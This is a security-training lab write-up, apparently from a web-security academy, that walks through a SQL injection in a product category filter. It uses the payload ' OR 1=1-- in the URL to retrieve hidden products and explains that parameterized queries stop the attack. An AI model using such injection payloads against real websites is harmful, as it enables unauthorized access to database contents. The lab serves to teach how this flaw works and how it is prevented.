# Lab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

## 🎯 Objective

Exploit a SQL Injection vulnerability in the product category filter to retrieve hidden products by modifying the SQL query.

---

## 📖 What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. By injecting malicious SQL syntax into user-controlled input, an attacker can access unauthorized data, bypass authentication, or manipulate the database.

---

## 🚀 Procedure

### Step 1

Open the lab and click **Access the Lab**.

### Step 2

Select any product category.

Observe that the URL changes to something similar to:

```text
/filter?category=Gifts
```

### Step 3

Modify the `category` parameter by appending the following payload:

```sql
' OR 1=1--
```

The URL becomes:

```text
/filter?category=Gifts'+OR+1=1--
```

### Step 4

Press **Enter** to send the request.

### Step 5

The SQL query becomes:

```sql
SELECT * FROM products
WHERE category = 'Gifts' OR 1=1--'
AND released = 1
```

### Step 6

Since the condition `1=1` is always true, the database returns **all products**, including hidden or unreleased items.

### Step 7

The lab is marked as **Solved**.

---

## 💻 Payload Used

```sql
' OR 1=1--
```

---

## ⚙️ Why It Works

The application directly inserts user input into an SQL query without proper validation or parameterized queries. The injected condition:

```sql
OR 1=1
```

always evaluates to **TRUE**, causing the database to ignore the intended filter and return every record.

The `--` sequence comments out the remaining part of the SQL statement, preventing syntax errors.

---

## 🏁 Conclusion

This lab demonstrates a classic SQL Injection vulnerability in a `WHERE` clause. By injecting the payload `' OR 1=1--`, the application's filtering logic is bypassed, allowing retrieval of hidden data. This highlights the importance of using parameterized queries and proper input validation to prevent SQL Injection attacks.
